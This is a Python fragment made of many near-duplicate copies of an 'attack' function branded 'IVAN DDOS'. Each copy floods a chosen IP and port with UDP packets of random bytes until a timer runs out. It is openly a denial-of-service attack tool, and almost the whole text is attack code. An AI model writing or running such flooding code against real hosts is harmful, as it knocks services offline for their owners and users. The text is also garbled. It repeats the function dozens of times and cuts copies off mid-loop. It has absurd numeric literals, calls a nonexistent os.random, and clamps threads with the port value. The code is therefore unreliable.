    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
